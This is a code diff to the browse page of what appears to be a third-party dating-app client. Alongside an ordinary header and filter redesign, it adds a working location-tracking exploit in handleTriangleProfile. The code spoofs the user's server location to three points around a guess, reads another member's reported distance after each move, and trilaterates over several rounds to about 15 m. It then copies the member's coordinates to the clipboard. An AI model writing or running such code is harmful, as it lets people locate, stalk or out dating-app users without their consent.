@@ -1,5 +1,5 @@
 import { useAuth } from "../../contexts/useAuth";
-import { MapPin, SlidersHorizontal, ListFilter, Star, Plane, Droplet, Search, Users } from "lucide-react";
+import { MapPin, SlidersHorizontal, ArrowUpDown, Star, Plane, Droplet, Search, Users } from "lucide-react";
 import { useLocation, useNavigate } from "react-router-dom";
 import toast from "react-hot-toast";
 import { useApiFunctions } from "../../hooks/useApiFunctions";
@@ -35,7 +35,6 @@ import { PullToRefreshContainer } from "./components/PullToRefreshContainer";
 import { useBrowseFilters } from "./gridpage/hooks/useBrowseFilters";
 import { useTapProfile } from "./gridpage/hooks/useTapProfile";
 import { useDesktopBreakpoint } from "../../hooks/useDesktopBreakpoint";
-import { useMediaQuery } from "../../hooks/useMediaQuery";
 import { useManagedGenders, useManagedPronouns, useBlockedProfileIds, useBlockProfile, useUnblockProfile } from "../../hooks/queries/useProfileQueries";
 import {
 	getChatContactIndexForProfiles,
@@ -80,6 +79,7 @@ export function GridPage() {
 	const [activeProfile, setActiveProfile] = useState<ProfileDetail | null>(null);
 	const [isLoadingActiveProfile, setIsLoadingActiveProfile] = useState(false);
 	const [activeProfileError, setActiveProfileError] = useState<string | null>(null);
+	const [isLocatingProfile, setIsLocatingProfile] = useState(false);
 
 	const { data: managedGenders } = useManagedGenders();
 	const { data: managedPronouns } = useManagedPronouns();
@@ -138,7 +138,6 @@ export function GridPage() {
 	const [hasAttemptedFetchNotes, setHasAttemptedFetchNotes] = useState(false);
 
 	const isDesktop = useDesktopBreakpoint();
-	const isSmUp = useMediaQuery("(min-width: 640px)");
 	const [mobileKeyboardInset, setMobileKeyboardInset] = useState(0);
 
 	useEffect(() => {
@@ -883,43 +882,190 @@ export function GridPage() {
 		navigate(`/chat?${nextParams.toString()}`);
 	};
 
-	const handleTriangleProfile = (targetProfileId: string) => {
+	const solveTrilateration = (points: { lat: number; lon: number; dist: number }[]) => {
+		const p1 = points[0];
+		const p2 = points[1];
+		const p3 = points[2];
+
+		const latToM = 111320;
+		const lonToM = 111320 * Math.cos(p1.lat * (Math.PI / 180));
+
+		const x2 = (p2.lon - p1.lon) * lonToM;
+		const y2 = (p2.lat - p1.lat) * latToM;
+		const x3 = (p3.lon - p1.lon) * lonToM;
+		const y3 = (p3.lat - p1.lat) * latToM;
+
+		const r1 = p1.dist;
+		const r2 = p2.dist;
+		const r3 = p3.dist;
+
+		const A = 2 * x2;
+		const B = 2 * y2;
+		const C = Math.pow(r1, 2) - Math.pow(r2, 2) + Math.pow(x2, 2) + Math.pow(y2, 2);
+		const D = 2 * x3;
+		const E = 2 * y3;
+		const F = Math.pow(r1, 2) - Math.pow(r3, 2) + Math.pow(x3, 2) + Math.pow(y3, 2);
+
+		const denom = A * E - D * B;
+		if (Math.abs(denom) < 1e-10) {
+			throw new Error("Trilateration failed: measurement points are collinear or too close together. Try again with a larger initial offset.");
+		}
+		const x = (C * E - F * B) / denom;
+		const y = (A * F - D * C) / denom;
+
+		return {
+			lat: p1.lat + (y / latToM),
+			lon: p1.lon + (x / lonToM)
+		};
+	};
+
+	const handleTriangleProfile = async (targetProfileId: string) => {
 		if (!geohash) {
 			toast.error(t("browse_page.errors.location_required"));
 			return;
 		}
 
+		if (isLocatingProfile) {
+			return;
+		}
+
+		const currentDistance = activeProfile?.distance ?? null;
+		if (currentDistance === null || !Number.isFinite(currentDistance)) {
+			toast.error(t("profile_details.location_finder_error_distance"));
+			return;
+		}
+
+		const confirmed = window.confirm(t("profile_details.location_finder_confirm"));
+		if (!confirmed) {
+			return;
+		}
+
+		setIsLocatingProfile(true);
+
+		let originalLat: number;
+		let originalLon: number;
+
 		try {
 			const decoded = decodeGeohash(geohash);
-			const latitude = (decoded.lat[0] + decoded.lat[1]) / 2;
-			const longitude = (decoded.lon[0] + decoded.lon[1]) / 2;
-			const distanceMeters =
-				typeof activeProfile?.distance === "number" &&
-				Number.isFinite(activeProfile.distance)
-					? Math.round(activeProfile.distance)
-					: null;
+			originalLat = (decoded.lat[0] + decoded.lat[1]) / 2;
+			originalLon = (decoded.lon[0] + decoded.lon[1]) / 2;
+		} catch (error) {
+			toast.error(
+				error instanceof Error
+					? error.message
+					: t("browse_page.errors.location_read_failed"),
+			);
+			setIsLocatingProfile(false);
+			return;
+		}
 
-			if (distanceMeters !== null) {
-				toast.success(
-					t("browse_page.toasts.distance_info", {
-						lat: latitude.toFixed(5),
-						lon: longitude.toFixed(5),
-						id: targetProfileId,
-						distance: distanceMeters,
-					}),
-				);
+		const waitMs = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
+
+		const putServerLocation = async (lat: number, lon: number, targetGeohash: string) => {
+			const payloads = [
+				{ lat, lon },
+				{ latitude: lat, longitude: lon },
+				{ geohash: targetGeohash },
+				{ nearbyGeoHash: targetGeohash },
+			];
+
+			for (const payload of payloads) {
+				try {
+					const response = await apiFunctions.request("/v4/location", {
+						method: "PUT",
+						body: payload,
+					});
+					if (response.status >= 200 && response.status < 300) return;
+				} catch (e) {
+					continue;
+				}
+			}
+			throw new Error("Failed to update server location across all payload types.");
+		};
+
+		const getDistanceFromProfile = async (): Promise<number | null> => {
+			try {
+				const profile = await apiFunctions.getProfileDetail(targetProfileId);
+				return typeof profile.distance === "number" && Number.isFinite(profile.distance)
+					? profile.distance
+					: null;
+			} catch {
+				return null;
+			}
+		};
+
+		try {
+			const initialDist = await getDistanceFromProfile();
+			if (initialDist === null) {
+				toast.error(t("profile_details.location_finder_error_distance"));
 				return;
 			}
 
-			toast.success(
-				t("browse_page.toasts.distance_unavailable", {
-					lat: latitude.toFixed(5),
-					lon: longitude.toFixed(5),
-					id: targetProfileId,
-				}),
-			);
-		} catch {
-			toast.error(t("browse_page.errors.location_read_failed"));
+			let currentLat = originalLat;
+			let currentLon = originalLon;
+			const targetPrecision = 15;
+			let rounds = Math.ceil(Math.log(initialDist / targetPrecision) / Math.log(3));
+			rounds = Math.max(2, Math.min(rounds, 6));
+
+			let offset = (initialDist * 1.5) / 111320;
+
+			toast.success(t("profile_details.location_finder_start", { distance: Math.round(initialDist), rounds }));
+
+			for (let i = 0; i < rounds; i++) {
+				const points = [
+					{ lat: currentLat + offset, lon: currentLon },
+					{ lat: currentLat - (offset / 2), lon: currentLon + (offset * 0.866) },
+					{ lat: currentLat - (offset / 2), lon: currentLon - (offset * 0.866) },
+				];
+
+				const results: { lat: number; lon: number; dist: number }[] = [];
+
+				for (const p of points) {
+					await putServerLocation(p.lat, p.lon, encodeGeohash(p.lat, p.lon));
+					await waitMs(5000);
+					const d = await getDistanceFromProfile();
+					if (d !== null) results.push({ lat: p.lat, lon: p.lon, dist: d });
+				}
+
+				if (results.length === 3) {
+					const estimate = solveTrilateration(results);
+					currentLat = estimate.lat;
+					currentLon = estimate.lon;
+					offset /= 3;
+
+					toast.success(t("profile_details.location_finder_round_complete", {
+						round: i + 1,
+						lat: currentLat.toFixed(6),
+						lon: currentLon.toFixed(6),
+						distance: Math.round(results[0].dist)
+					}));
+
+					toast.success(t("profile_details.location_finder_error_estimate", {
+						round: i + 1,
+						error: Math.round(offset * 111320)
+					}));
+				}
+			}
+
+			const finalCoords = `${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
+			toast.success(t("profile_details.location_finder_final_location", {
+				lat: currentLat.toFixed(6),
+				lon: currentLon.toFixed(6),
+				error: Math.round(offset * 111320)
+			}));
+
+			try {
+				await navigator.clipboard.writeText(finalCoords);
+				toast.success(t("profile_details.location_finder_location_copied"));
+			} catch (err) {
+				appLog.error("Failed to copy location to clipboard", err);
+			}
+		} catch (error) {
+			toast.error(error instanceof Error ? error.message : t("profile_details.location_finder_error_general"));
+		} finally {
+			await waitMs(10000);
+			await putServerLocation(originalLat, originalLon, geohash);
+			setIsLocatingProfile(false);
 		}
 	};
 
@@ -1122,350 +1268,221 @@ export function GridPage() {
 				isDisabled={isLoadingCards || isLoadingMoreCards}
 				refreshingLabel={t("browse_page.refreshing_feed")}
 			>
-				<header className="mb-2 px-[var(--app-px)] sm:px-4">
-					{!isSmUp ? (
+				<header className="mb-3 px-[var(--app-px)] sm:px-4">
+					{/* Top Header Bar (Unified) */}
+					<div className="flex items-center justify-between gap-4 mb-3">
+						{/* Title & Stats Subtitle */}
 						<div>
-							<div>
-								<div className="mb-1 flex items-center gap-2">
-								<button
-									type="button"
-									onClick={() => navigate("/settings")}
-									className="shrink-0 rounded-full transition-all active:scale-95"
-									aria-label={t("browse_page.open_settings")}
-									title={t("browse_page.settings")}
-								>
-									<Avatar
-										src={profilePhotoUrl}
-										alt={t("browse_page.your_profile_photo")}
-										className="h-11 w-11"
-									/>
-								</button>
-
-								<button
-									type="button"
-									onClick={() => navigate("/browse/location")}
-									className="inline-flex min-h-12 w-full items-center justify-start gap-2 rounded-2xl bg-[color-mix(in_srgb,var(--surface-2)_84%,transparent)] px-4 text-left text-base font-medium text-[var(--text-muted)] transition active:scale-[0.99] overflow-hidden"
-								>
-									<MapPin className="h-4 w-4 shrink-0" />
-									<span className="truncate">
-										{locationName || t("browse_page.current_location")}
+							<h1 className="app-title">{t("nav.browse")}</h1>
+							<div className="flex items-center gap-2 mt-1 text-xs font-semibold text-[var(--text-muted)] select-none">
+								<span className="inline-flex items-center gap-1.5">
+									<span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse" />
+									<span>
+										{t("browse_page.online_stats", "{{online}} of {{total}} online now", {
+											online: onlineCount,
+											total: cards.length,
+										})}
 									</span>
-								</button>
-							</div>
-
-							<div className="-mx-[var(--app-px)] overflow-x-auto pb-1 pt-2 [scrollbar-width:none] [&::-webkit-scrollbar]:hidden">
-								<div className="flex min-w-max items-center gap-3 px-[var(--app-px)] ml-auto">
-									<button
-										type="button"
-										onClick={() =>
-											navigate("/browse/filters", {
-												state: {
-													browseFiltersDraft: {
-														sortBy,
-														browseFilters,
-														ageMin,
-														ageMax,
-														heightCmMin,
-														heightCmMax,
-														weightGramsMin,
-														weightGramsMax,
-														tribes,
-														lookingFor,
-														relationshipStatuses,
-														bodyTypes,
-														sexualPositions,
-														meetAt,
-														nsfwPics,
-														tags,
-													},
-												},
-											})
-										}
-										className="inline-flex min-h-8 items-center justify-center gap-2 rounded-full bg-[var(--surface-2)] px-5 text-sm font-semibold text-[var(--text)]"
-									>
-										<span className="flex items-center gap-2">
-											<SlidersHorizontal className="h-4 w-4" />
-											{hasActiveBrowseFilters ? (
-												<span className="inline-flex min-w-5 items-center justify-center rounded-full bg-[var(--accent)] px-1.5 py-0.5 text-[10px] font-semibold text-[var(--accent-contrast)]">
-													{activeFilterCount}
-												</span>
-											) : null}
-										</span>
-									</button>
-
-									<div className="relative inline-flex min-h-8 items-center justify-center rounded-full bg-[var(--surface-2)] pl-4 pr-2 text-sm font-semibold text-[var(--text)]">
-										<ListFilter className="mr-1.5 h-4 w-4 shrink-0 text-[var(--text-muted)]" />
-										<select
-											value={sortBy}
-											onChange={(e) => setSortBy(e.target.value as BrowseSortOption)}
-											className="appearance-none bg-transparent cursor-pointer outline-none w-full h-full pr-3 pl-2"
-										>
-											<option value="default">{t("browse_filters.sort.default")}</option>
-											<option value="distance">{t("browse_filters.sort.distance")}</option>
-											<option value="age-asc">{t("browse_filters.sort.youngest")}</option>
-											<option value="age-desc">{t("browse_filters.sort.oldest")}</option>
-											<option value="popular">{t("browse_filters.sort.popular")}</option>
-											<option value="name">{t("browse_filters.sort.name_az")}</option>
-										</select>
-									</div>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												onlineOnly: !prev.onlineOnly,
-											}))
-										}
-										className={`inline-flex min-h-8 items-center justify-center rounded-full px-5 text-sm font-semibold transition ${browseFilters.onlineOnly ? "bg-[var(--accent)] text-[var(--accent-contrast)]" : "bg-[var(--surface-2)] text-[var(--text)]"}`}
-									>
-										{t("browse_filters.options.online")}
-									</button>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												favorites: !prev.favorites,
-											}))
-										}
-										className={`inline-flex min-h-8 items-center justify-center rounded-full px-5 transition ${browseFilters.favorites ? "bg-[var(--accent)] text-[var(--accent-contrast)]" : "bg-[var(--surface-2)] text-[var(--text)]"}`}
-										aria-label={t("browse_filters.options.favorites")}
-										title={t("browse_filters.options.favorites")}
-									>
-										<Star
-											className={`h-4 w-4 ${browseFilters.favorites ? "fill-current" : ""}`}
-										/>
-									</button>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												rightNow: !prev.rightNow,
-											}))
-										}
-										className={`inline-flex min-h-8 items-center justify-center rounded-full px-5 transition ${browseFilters.rightNow ? "bg-[var(--accent)] text-[var(--accent-contrast)]" : "bg-[var(--surface-2)] text-[var(--text)]"}`}
-										aria-label={t("browse_filters.options.right_now")}
-										title={t("browse_filters.options.right_now")}
-									>
-										<Droplet
-											className={`h-4 w-4 ${browseFilters.rightNow ? "fill-current" : ""}`}
-										/>
-									</button>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												isVisiting: !prev.isVisiting,
-											}))
-										}
-										className={`inline-flex min-h-8 items-center justify-center rounded-full px-5 transition ${browseFilters.isVisiting ? "bg-[var(--accent)] text-[var(--accent-contrast)]" : "bg-[var(--surface-2)] text-[var(--text)]"}`}
-										aria-label={t("profile_details.visiting")}
-										title={t("profile_details.visiting")}
-									>
-										<Plane
-											className={`h-4 w-4 ${browseFilters.isVisiting ? "fill-current" : ""}`}
-										/>
-									</button>
-
-									{hasActiveBrowseFilters ? (
-										<button
-											type="button"
-											onClick={clearBrowseFilters}
-											className="inline-flex min-h-8 items-center justify-center rounded-full bg-[var(--surface-2)] px-5 text-sm font-semibold text-[var(--text-muted)]"
-										>
-											{t("browse_filters.clear_all")}
-										</button>
-									) : null}
-								</div>
+								</span>
 							</div>
 						</div>
+
+						{/* Settings Avatar */}
+						<button
+							type="button"
+							onClick={() => navigate("/settings")}
+							className="shrink-0 rounded-full transition-all active:scale-95 hover:scale-[1.03]"
+							aria-label={t("browse_page.open_settings")}
+							title={t("browse_page.settings")}
+						>
+							<Avatar
+								src={profilePhotoUrl}
+								alt={t("browse_page.your_profile_photo")}
+								className="h-11 w-11"
+							/>
+						</button>
 					</div>
-					) : (
-						<div>
-							<div className="mb-2 flex items-start justify-between gap-4">
-								<div>
-								<h1 className="app-title flex items-center gap-2">
-									<span>{t("browse_page.title")}</span>
-									<span className="text-xs text-[var(--text-muted)] opacity-40 select-none">•</span>
-									<span className="text-lg font-bold text-[var(--accent)] tracking-tight flex items-center gap-1.5">
-										<Users className="h-4.5 w-4.5 stroke-[2.5]" />
-										<span>{cards.length}</span>
-									</span>
-								</h1>
-								<div className="mt-2 flex flex-wrap items-center gap-2">
-									<div className="inline-flex items-center gap-1.5 rounded-full border border-[var(--border)] bg-[var(--surface-2)] px-2.5 py-1 text-xs font-semibold text-[var(--text-muted)]">
-										<span
-											className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"
-											aria-hidden="true"
-										/>
-										<span>{onlineCount}</span>
-									</div>
-									<button
-										type="button"
-										onClick={() => navigate("/browse/location")}
-										className="inline-flex items-center gap-2 rounded-full border border-[var(--border)] bg-[var(--surface-2)] px-3 py-1 text-xs font-medium text-[var(--text-muted)] transition hover:border-[var(--accent)] hover:text-[var(--text)] max-w-[200px]"
-									>
-										<MapPin className="h-3.5 w-3.5 shrink-0" />
-										<span className="hidden lg:inline truncate">
-											{locationName || t("browse_page.location")}
-										</span>
-									</button>
-									<button
-										type="button"
-										onClick={() =>
-											navigate("/browse/filters", {
-												state: {
-													browseFiltersDraft: {
-														sortBy,
-														browseFilters,
-														ageMin,
-														ageMax,
-														heightCmMin,
-														heightCmMax,
-														weightGramsMin,
-														weightGramsMax,
-														tribes,
-														lookingFor,
-														relationshipStatuses,
-														bodyTypes,
-														sexualPositions,
-														meetAt,
-														nsfwPics,
-														tags,
-													},
-												},
-											})
-										}
-										className="inline-flex items-center gap-2 rounded-full border border-[var(--border)] bg-[var(--surface-2)] px-3 py-1 text-xs font-medium text-[var(--text-muted)] transition hover:border-[var(--accent)] hover:text-[var(--text)]"
-									>
-										<SlidersHorizontal className="h-3.5 w-3.5" />
-										<span className="hidden lg:inline">
-											{t("browse_page.filter")}
-										</span>
-										{hasActiveBrowseFilters ? (
-											<span className="inline-flex min-w-5 items-center justify-center rounded-full bg-[var(--accent)] px-1.5 py-0.5 text-[10px] font-semibold text-[var(--accent-contrast)]">
-												{activeFilterCount}
-											</span>
-										) : null}
-									</button>
 
-									<div className="relative inline-flex items-center rounded-full border border-[var(--border)] bg-[var(--surface-2)] pl-2.5 pr-1.5 py-1 text-xs font-medium text-[var(--text-muted)] transition hover:border-[var(--accent)] hover:text-[var(--text)] focus-within:border-[var(--accent)] focus-within:text-[var(--text)]">
-										<ListFilter className="mr-1 h-3.5 w-3.5 shrink-0" />
-										<select
-											value={sortBy}
-											onChange={(e) => setSortBy(e.target.value as BrowseSortOption)}
-											className="appearance-none bg-transparent cursor-pointer outline-none pr-3"
-										>
-											<option value="default">{t("browse_page.sort")}</option>
-											<option value="distance">{t("browse_filters.sort.distance")}</option>
-											<option value="age-asc">{t("browse_filters.sort.youngest")}</option>
-											<option value="age-desc">{t("browse_filters.sort.oldest")}</option>
-											<option value="popular">{t("browse_filters.sort.popular")}</option>
-											<option value="name">{t("browse_filters.sort.name_az")}</option>
-										</select>
-									</div>
+					{/* Second Row: Location Picker */}
+					<div className="mb-3 flex flex-wrap items-center gap-2">
+						<button
+							type="button"
+							onClick={() => navigate("/browse/location")}
+							className="inline-flex min-h-11 w-full sm:w-fit sm:max-w-[280px] items-center justify-start gap-2 rounded-2xl sm:rounded-full bg-[color-mix(in_srgb,var(--surface-2)_84%,transparent)] border border-[var(--border)] px-4 py-1.5 text-left text-sm font-medium text-[var(--text-muted)] transition active:scale-[0.99] hover:border-[var(--accent)] hover:text-[var(--text)] overflow-hidden"
+						>
+							<MapPin className="h-4 w-4 shrink-0" />
+							<span className="truncate">
+								{locationName || t("browse_page.current_location")}
+							</span>
+						</button>
+					</div>
 
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												favorites: !prev.favorites,
-											}))
-										}
-										className={`inline-flex items-center gap-2 rounded-full border border-[var(--border)] px-3 py-1 text-xs font-medium transition ${
-											browseFilters.favorites
-												? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
-												: "bg-[var(--surface-2)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
-										}`}
-									>
-										<Star
-											className={`h-3.5 w-3.5 ${browseFilters.favorites ? "fill-current" : ""}`}
-										/>
-										<span className="hidden lg:inline">
-											{t("browse_filters.options.favorites")}
-										</span>
-									</button>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												rightNow: !prev.rightNow,
-											}))
-										}
-										className={`inline-flex items-center gap-2 rounded-full border border-[var(--border)] px-3 py-1 text-xs font-medium transition ${
-											browseFilters.rightNow
-												? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
-												: "bg-[var(--surface-2)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
-										}`}
-									>
-										<Droplet
-											className={`h-3.5 w-3.5 ${browseFilters.rightNow ? "fill-current" : ""}`}
-										/>
-										<span className="hidden lg:inline">
-											{t("browse_filters.options.right_now")}
-										</span>
-									</button>
-
-									<button
-										type="button"
-										onClick={() =>
-											setBrowseFilters((prev: typeof browseFilters) => ({
-												...prev,
-												isVisiting: !prev.isVisiting,
-											}))
-										}
-										className={`inline-flex items-center gap-2 rounded-full border border-[var(--border)] px-3 py-1 text-xs font-medium transition ${
-											browseFilters.isVisiting
-												? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
-												: "bg-[var(--surface-2)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
-										}`}
-									>
-										<Plane
-											className={`h-3.5 w-3.5 ${browseFilters.isVisiting ? "fill-current" : ""}`}
-										/>
-										<span className="hidden lg:inline">
-											{t("profile_details.visiting")}
-										</span>
-									</button>
-
-									{hasActiveBrowseFilters ? (
-										<button
-											type="button"
-											onClick={clearBrowseFilters}
-											className="inline-flex items-center gap-1 rounded-full border border-[var(--border)] bg-[var(--surface-2)] px-3 py-1 text-xs font-medium text-[var(--text-muted)] transition hover:border-[var(--accent)] hover:text-[var(--text)]"
-										>
-											{t("browse_filters.clear_all")}
-										</button>
-									) : null}
-								</div>
+					{/* Third Row: Filters / Actions Scrollable Bar */}
+					<div className="-mx-[var(--app-px)] sm:mx-0 overflow-x-auto pb-1 pt-1 [scrollbar-width:none] [&::-webkit-scrollbar]:hidden">
+						<div className="flex min-w-max items-center gap-3 px-[var(--app-px)] sm:px-0">
+							{/* Sort Selector */}
+							<div className={`relative inline-flex min-h-8 items-center justify-center gap-2 rounded-full transition border cursor-pointer active:scale-95 px-4 ${
+								sortBy !== "default"
+									? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
+									: "bg-[var(--surface-2)] border-[var(--border)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)] focus-within:border-[var(--accent)]"
+							}`}>
+								<ArrowUpDown className="h-3.5 w-3.5 shrink-0" />
+								<span className="hidden lg:inline text-xs font-semibold">
+									{sortBy === "default" && t("browse_filters.sort.default")}
+									{sortBy === "distance" && t("browse_filters.sort.distance")}
+									{sortBy === "age-asc" && t("browse_filters.sort.youngest")}
+									{sortBy === "age-desc" && t("browse_filters.sort.oldest")}
+									{sortBy === "popular" && t("browse_filters.sort.popular")}
+									{sortBy === "name" && t("browse_filters.sort.name_az")}
+								</span>
+								<select
+									value={sortBy}
+									onChange={(e) => setSortBy(e.target.value as BrowseSortOption)}
+									className="absolute inset-0 opacity-0 w-full h-full cursor-pointer"
+									aria-label={t("browse_page.sort", "Sort")}
+								>
+									<optgroup label={t("browse_page.sort", "Sort")}>
+										<option value="default">{t("browse_filters.sort.default")}</option>
+										<option value="distance">{t("browse_filters.sort.distance")}</option>
+										<option value="age-asc">{t("browse_filters.sort.youngest")}</option>
+										<option value="age-desc">{t("browse_filters.sort.oldest")}</option>
+										<option value="popular">{t("browse_filters.sort.popular")}</option>
+										<option value="name">{t("browse_filters.sort.name_az")}</option>
+									</optgroup>
+								</select>
 							</div>
-							<div className="flex flex-col items-end gap-2">
+
+							{/* Filter Button */}
+							<button
+								type="button"
+								onClick={() =>
+									navigate("/browse/filters", {
+										state: {
+											browseFiltersDraft: {
+												sortBy,
+												browseFilters,
+												ageMin,
+												ageMax,
+												heightCmMin,
+												heightCmMax,
+												weightGramsMin,
+												weightGramsMax,
+												tribes,
+												lookingFor,
+												relationshipStatuses,
+												bodyTypes,
+												sexualPositions,
+												meetAt,
+												nsfwPics,
+												tags,
+											},
+										},
+									})
+								}
+								className="inline-flex min-h-8 items-center justify-center gap-2 rounded-full bg-[var(--surface-2)] border border-[var(--border)] px-4 text-xs font-semibold text-[var(--text)] transition hover:border-[var(--accent)] active:scale-95 cursor-pointer"
+							>
+								<SlidersHorizontal className="h-3.5 w-3.5" />
+								<span className="hidden lg:inline">{t("browse_page.filter")}</span>
+								{hasActiveBrowseFilters ? (
+									<span className="inline-flex min-w-5 items-center justify-center rounded-full bg-[var(--accent)] px-1.5 py-0.5 text-[10px] font-semibold text-[var(--accent-contrast)]">
+										{activeFilterCount}
+									</span>
+								) : null}
+							</button>
+
+							{/* Online Only Toggle */}
+							<button
+								type="button"
+								onClick={() =>
+									setBrowseFilters((prev: typeof browseFilters) => ({
+										...prev,
+										onlineOnly: !prev.onlineOnly,
+									}))
+								}
+								className={`inline-flex min-h-8 items-center justify-center rounded-full px-4 text-xs font-semibold transition border cursor-pointer active:scale-95 ${
+									browseFilters.onlineOnly
+										? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
+										: "bg-[var(--surface-2)] border-[var(--border)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
+								}`}
+							>
+								{t("browse_filters.options.online")}
+							</button>
+
+							{/* Favorites Toggle */}
+							<button
+								type="button"
+								onClick={() =>
+									setBrowseFilters((prev: typeof browseFilters) => ({
+										...prev,
+										favorites: !prev.favorites,
+									}))
+								}
+								className={`inline-flex min-h-8 items-center justify-center gap-2 rounded-full px-4 text-xs font-semibold transition border cursor-pointer active:scale-95 ${
+									browseFilters.favorites
+										? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
+										: "bg-[var(--surface-2)] border-[var(--border)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
+								}`}
+								aria-label={t("browse_filters.options.favorites")}
+								title={t("browse_filters.options.favorites")}
+							>
+								<Star className={`h-3.5 w-3.5 ${browseFilters.favorites ? "fill-current" : ""}`} />
+								<span className="hidden lg:inline">{t("browse_filters.options.favorites")}</span>
+							</button>
+
+							{/* Right Now Toggle */}
+							<button
+								type="button"
+								onClick={() =>
+									setBrowseFilters((prev: typeof browseFilters) => ({
+										...prev,
+										rightNow: !prev.rightNow,
+									}))
+								}
+								className={`inline-flex min-h-8 items-center justify-center gap-2 rounded-full px-4 text-xs font-semibold transition border cursor-pointer active:scale-95 ${
+									browseFilters.rightNow
+										? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
+										: "bg-[var(--surface-2)] border-[var(--border)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
+								}`}
+								aria-label={t("browse_filters.options.right_now")}
+								title={t("browse_filters.options.right_now")}
+							>
+								<Droplet className={`h-3.5 w-3.5 ${browseFilters.rightNow ? "fill-current" : ""}`} />
+								<span className="hidden lg:inline">{t("browse_filters.options.right_now")}</span>
+							</button>
+
+							{/* Visiting Toggle */}
+							<button
+								type="button"
+								onClick={() =>
+									setBrowseFilters((prev: typeof browseFilters) => ({
+										...prev,
+										isVisiting: !prev.isVisiting,
+									}))
+								}
+								className={`inline-flex min-h-8 items-center justify-center gap-2 rounded-full px-4 text-xs font-semibold transition border cursor-pointer active:scale-95 ${
+									browseFilters.isVisiting
+										? "bg-[var(--accent)] border-[var(--accent)] text-[var(--accent-contrast)]"
+										: "bg-[var(--surface-2)] border-[var(--border)] text-[var(--text-muted)] hover:border-[var(--accent)] hover:text-[var(--text)]"
+								}`}
+								aria-label={t("profile_details.visiting")}
+								title={t("profile_details.visiting")}
+							>
+								<Plane className={`h-3.5 w-3.5 ${browseFilters.isVisiting ? "fill-current" : ""}`} />
+								<span className="hidden lg:inline">{t("profile_details.visiting")}</span>
+							</button>
+
+							{/* Clear All Button */}
+							{hasActiveBrowseFilters ? (
 								<button
 									type="button"
-									onClick={() => navigate("/settings")}
-									className="rounded-full transition-all hover:scale-[1.03]"
-									aria-label={t("browse_page.open_settings")}
-									title={t("browse_page.settings")}
+									onClick={clearBrowseFilters}
+									className="inline-flex min-h-8 items-center justify-center gap-1 rounded-full border border-[var(--border)] bg-[var(--surface-2)] px-4 text-xs font-medium text-[var(--text-muted)] transition hover:border-[var(--accent)] hover:text-[var(--text)] cursor-pointer active:scale-95"
 								>
-									<Avatar
-										src={profilePhotoUrl}
-										alt={t("browse_page.your_profile_photo")}
-										className="h-11 w-11"
-									/>
+									{t("browse_filters.clear_all")}
 								</button>
-							</div>
+							) : null}
 						</div>
 					</div>
-					)}
 				</header>
 
 				<div
@@ -1569,6 +1586,7 @@ export function GridPage() {
 				)}
 				isBlocked={activeProfileId ? blockedProfileIds.has(activeProfileId) : false}
 				isBlockingProfile={isBlockingProfile || isUnblockingProfile}
+				isLocatingProfile={isLocatingProfile}
 				onTapProfile={handleTapProfile}
 				isTappingProfile={Boolean(tappingProfileId && tappingProfileId === activeProfileId)}
 				isTapBlocked={hasSentTapRecently}
